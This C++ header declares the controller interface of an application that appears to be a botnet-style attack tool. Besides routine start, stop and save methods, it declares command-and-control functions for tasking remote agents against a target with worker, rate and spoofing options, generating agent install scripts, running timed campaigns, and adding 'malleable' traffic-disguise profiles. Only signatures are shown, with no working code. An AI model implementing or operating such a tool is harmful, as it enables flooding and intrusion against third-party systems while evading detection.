#pragma once

#include "config/config.hpp"
#include "ftxui/state.hpp"

#include <memory>

namespace app {

class ApplicationController {
public:
    virtual ~ApplicationController() = default;

    virtual ui::ApplicationSnapshot snapshot() const = 0;
    virtual void launch(const config::Config& config) = 0;
    virtual void stop() = 0;
    virtual void save(const config::Config& config) = 0;
    virtual void reset() = 0;
    virtual void pause() = 0;
    virtual void resume() = 0;

    virtual void c2_start_server(std::uint16_t port, const std::string& psk) = 0;
    virtual void c2_stop_server() = 0;
    virtual void c2_broadcast_task(const std::string& target, std::uint16_t port,
                                   int mode_index, std::uint32_t workers, std::uint32_t rate,
                                   bool spoof) = 0;
    virtual void c2_send_task_to_agent(const std::string& agent_id, const std::string& target,
                                       std::uint16_t port, int mode_index,
                                       std::uint32_t workers, std::uint32_t rate,
                                       bool spoof) = 0;
    virtual void c2_stop_task(const std::string& agent_id) = 0;
    virtual std::string c2_install_script() const = 0;
    virtual void c2_create_campaign(const std::string& name, const std::string& target,
                                    std::uint16_t port, int mode_index,
                                    std::uint32_t workers, std::uint32_t rate,
                                    std::uint32_t duration_sec) = 0;
    virtual void c2_add_malleable(const std::string& name, const std::string& user_agent,
                                  const std::string& uri, const std::string& content_type) = 0;
};

std::unique_ptr<ApplicationController> create_application_controller(config::Config config);

} // namespace app
